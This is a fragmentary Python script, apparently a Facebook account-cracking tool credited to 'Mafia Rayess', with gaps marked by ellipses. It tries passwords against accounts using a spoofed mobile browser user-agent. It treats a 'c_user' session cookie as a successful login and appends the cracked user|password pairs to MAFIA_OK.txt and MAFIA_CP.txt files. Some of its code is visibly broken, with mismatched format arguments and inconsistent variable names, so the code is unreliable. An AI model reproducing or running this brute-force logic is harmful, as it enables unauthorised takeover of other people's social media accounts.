...
logo =                                          """   
   ...
   \033[1;37m #     # 
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           Mafia Rayess
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          Danger Mafia
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           Criminal313
\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m             0.5
\033[1;37m------------------------\033[1;37m------------------------ """                                              
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mMAFIA_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mMAFIA_CP.txt' % (H, P, str(len(cp))))
        ...
        try:
            for pw in __chi__:
                ...
                header1 = {
                    ...
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [MAFIA-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('MAFIA_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [MAFIA-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('MAFIA_CP.txt' , 'a').write('%s\n' % wrt)
                        break
